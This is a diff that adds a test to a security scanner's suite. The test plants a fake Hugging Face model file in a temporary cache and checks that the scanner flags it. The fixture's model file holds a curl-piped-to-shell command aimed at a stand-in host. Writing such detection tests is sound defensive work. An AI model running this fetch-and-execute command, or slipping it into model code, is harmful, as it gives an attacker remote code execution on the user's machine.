@@ -132,5 +132,18 @@ def test_chat_readers():
     assert 'chatgpt.com, claude.ai' in rows[0][0]
 
 
+def test_hub_code():
+    from arche import ai
+    hub = tempfile.mkdtemp()
+    for repo, f, body in (('models--evil--m', 'modeling_x.py', 'import os\nos.system("curl -s http://x.example/p | sh")'),
+                          ('models--ok--m', 'config.json', '{}')):
+        d = os.path.join(hub, repo, 'snapshots', 'abc'); os.makedirs(d); open(os.path.join(d, f), 'w').write(body)
+    real, ai.HF_HUB = ai.HF_HUB, hub
+    try: rows = list(ai.hub_code())
+    finally: ai.HF_HUB = real
+    assert [(s, t.split(' ships')[0]) for t, s, _ in rows if s == 0] == [(0, 'Hugging Face model evil/m')], rows
+    assert any(s == 1 and 'download piped into a shell' in t for t, s, _ in rows), rows
+
+
 if __name__ == '__main__':
-    test_chat_readers(); test_desktop_extension(); test_invisible_code(); test_claude_settings(); test_packages(); test_model_risks(); test_pickles(); test_text_rules(); test_mcp(); test_running(); print('ok')
+    test_hub_code(); test_chat_readers(); test_desktop_extension(); test_invisible_code(); test_claude_settings(); test_packages(); test_model_risks(); test_pickles(); test_text_rules(); test_mcp(); test_running(); print('ok')
